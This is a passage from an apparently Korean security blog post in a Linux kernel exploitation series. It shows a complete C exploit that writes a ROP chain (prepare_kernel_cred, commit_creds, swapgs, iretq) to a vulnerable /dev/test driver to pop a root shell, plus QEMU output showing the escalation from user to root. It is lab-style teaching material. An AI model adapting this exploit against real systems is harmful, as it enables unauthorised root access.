class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>&#125;<br><br>void shell() &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    size_t rop[18] = &#123;0, &#125;;<br>    <br>    void *commit_creds = 0xffffffff8108e9f0;<br>    void *prepare_kernel_cred = 0xffffffff8108ec20;<br><br>    printf(&quot;[+] EXPLOIT!\n&quot;);<br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br>    printf(&quot;    open file /dev/test\n&quot;);<br><br>    backup_rv();<br><br>    memset(rop, 0x41, 40);<br>    rop[4] = 0xffffffff813fb9bc;    <br>    rop[5] = 0;<br>    rop[6] = prepare_kernel_cred;   // prepare_kernel_cred(0)<br>    rop[7] = 0xffffffff813f4ef2;    <br>    rop[8] = 0;<br>    rop[9] = 0xffffffff81b241f0;    <br>    rop[10] = commit_creds;         // commit_creds()  <br>    rop[11] = 0xffffffff81c00f58;   // swapgs; ret;<br>    rop[12] = 0xffffffff810252b2;   // iretq; ret;<br>    rop[13] = &amp;shell;<br>    rop[14] = rv.user_cs;<br>    rop[15] = rv.user_rflags;<br>    rop[16] = rv.user_rsp;<br>    rop[17] = rv.user_ss;<br><br>    printf(&quot;    write payload\n&quot;);<br><br>    printf(&quot;    attack device driver\n&quot;);<br>    write(fd, rop, sizeof(rop));<br>    <br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="공격결과"><a href="#공격결과" class="headerlink" title="공격결과"></a>공격결과</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]
/ $ whoami
user
/ $ ./exploit 
[+] EXPLOIT!
    open file /dev/test
    write payload
    attack device driver
/ # whoami
root
</code></pre>
<p></br></br></p>
<h2 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h2><pre><code>b30w0lf님의 운영체제(Operating System)
DREAMHACK - Linux Kernel Exploit
INFLEARN - 리눅스 커널 해킹. A부터 Z까지
https://www.lazenca.net/pages/viewpage.action?pageId=25624859
https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame
</code></pre>
<p></br></br></p>
<h2 id="한줄평"><a href="#한줄평" class="headerlink" title="한줄평"></a>한줄평</h2><p><img src="/img/rip.PNG" srcset="/img/loading.gif" lazyload></p>
<pre><code>I&#39;ll tell you all about it when i see you again. Rest in peace.
</code></pre>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/Research/">Research</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/exploit/">exploit</a>
                    
                      <a class="hover-with-bg" href="/tags/linux/">linux</a>
                    
                      <a class="hover-with-bg" href="/tags/kernel/">kernel</a>
                    
                      <a class="hover-with-bg" href="/tags/mitigation/">mitigation</a>
                    
                      <a class="hover-with-bg" href="/tags/smep/">smep</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/10/02/linux-kernel-exploit-bypassing-smap/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">[Research] Linux Kernel Exploit - Bypassing SMAP</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/09/28/linux-kernel-exploit-bypassing-kaslr/">
                        <span class="hidden-mobile">[Research] Linux Kernel Exploit - Bypassing KASLR</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>



  <script  src="/js/local-search.js" ></script>






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
